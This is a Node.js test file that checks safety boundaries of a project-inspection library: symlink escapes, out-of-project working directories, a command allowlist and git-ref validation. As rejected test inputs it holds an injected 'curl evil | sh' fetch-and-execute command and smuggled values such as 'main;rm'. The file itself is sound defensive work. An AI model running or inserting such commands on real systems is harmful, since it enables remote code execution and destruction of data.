import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  existsSafe,
  isSafeRef,
  readFileSafe,
  resolveAllowedCommand,
  runCommand,
  walkProject,
  CommandNotAllowedError,
  UnsafeWorkingDirectoryError,
} from "../dist/index.js";

/**
 * The boundaries an adversarial repository or MCP caller must not cross.
 * Symlink tests are skipped where the platform refuses to create links
 * (Windows without developer mode) - honestly, not silently.
 */

function scratch() {
  const base = mkdtempSync(join(tmpdir(), "project-surface-safety-"));
  const root = join(base, "repo");
  const outside = join(base, "outside");
  mkdirSync(root);
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "the secret");
  writeFileSync(join(root, "inside.txt"), "fine");
  return { base, root, outside };
}

function tryLink(target, path, type) {
  try {
    symlinkSync(target, path, type);
    return true;
  } catch {
    return false;
  }
}

test("a file inside the project is readable", () => {
  const { base, root } = scratch();
  try {
    assert.equal(readFileSafe(root, "inside.txt"), "fine");
    assert.equal(existsSafe(root, "inside.txt"), true);
    assert.equal(existsSafe(root, "missing.txt"), false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a symlink pointing outside the project is never followed", (t) => {
  const { base, root, outside } = scratch();
  try {
    if (!tryLink(join(outside, "secret.txt"), join(root, "leak.txt"), "file")) {
      return t.skip("symlinks not permitted on this machine");
    }
    assert.equal(readFileSafe(root, "leak.txt"), null);
    assert.equal(existsSafe(root, "leak.txt"), false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a symlinked directory pointing outside the project is never traversed", (t) => {
  const { base, root, outside } = scratch();
  try {
    if (!tryLink(outside, join(root, "vendor"), "junction")) {
      return t.skip("symlinks not permitted on this machine");
    }
    assert.equal(readFileSafe(root, "vendor/secret.txt"), null);
    assert.throws(
      () => runCommand(root, { id: "x", run: "echo hi", cwd: "vendor", kind: "other", provenance: {} }, { now: "2026-01-01T00:00:00Z" }),
      UnsafeWorkingDirectoryError
    );
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("a working directory outside the project is refused", () => {
  const { base, root } = scratch();
  try {
    const command = { id: "x", run: "echo hi", cwd: "../outside", kind: "other", provenance: {} };
    assert.throws(() => runCommand(root, command, { now: "2026-01-01T00:00:00Z" }), UnsafeWorkingDirectoryError);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("only commands present in the document can be resolved", () => {
  const surface = { commands: [{ id: "test", run: "npm test", cwd: ".", kind: "test" }] };
  assert.equal(resolveAllowedCommand(surface, "test").run, "npm test");
  assert.throws(() => resolveAllowedCommand(surface, "npm test; curl evil | sh"), CommandNotAllowedError);
  assert.throws(() => resolveAllowedCommand(surface, "--help"), CommandNotAllowedError);
});

test("git refs that would be parsed as options are rejected", () => {
  for (const ok of ["HEAD", "main", "v1.2.3", "HEAD~3", "origin/main", "abc123", "feature/x-y_z"]) {
    assert.equal(isSafeRef(ok), true, ok);
  }
  for (const bad of ["--output=/tmp/x", "-v", "", "HEAD..main", "a b", "main;rm", "HEAD@{1}"]) {
    assert.equal(isSafeRef(bad), false, bad);
  }
});

test("the walk skips ignored directories only, and excluded files do not spend the cap", () => {
  const { base, root } = scratch();
  try {
    writeFileSync(join(root, "build"), "a file, not the build directory");
    mkdirSync(join(root, "node_modules", "dep"), { recursive: true });
    writeFileSync(join(root, "node_modules", "dep", "index.js"), "");
    mkdirSync(join(root, "assets"));
    for (let i = 0; i < 5; i++) writeFileSync(join(root, "assets", `${i}.bin`), "");

    const all = walkProject(root);
    assert.equal(all.source, "filesystem");
    assert.ok(all.files.includes("build"), all.files.join(", "));
    assert.ok(!all.files.some((f) => f.startsWith("node_modules/")), all.files.join(", "));

    /* Five ignored assets plus two real files, capped at three: the ignore
       must be applied first or the cap would fall on `assets/`. */
    const capped = walkProject(root, 3, (p) => p.startsWith("assets/"));
    assert.deepEqual(capped.files, ["build", "inside.txt"]);
    assert.equal(capped.truncated, false);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});
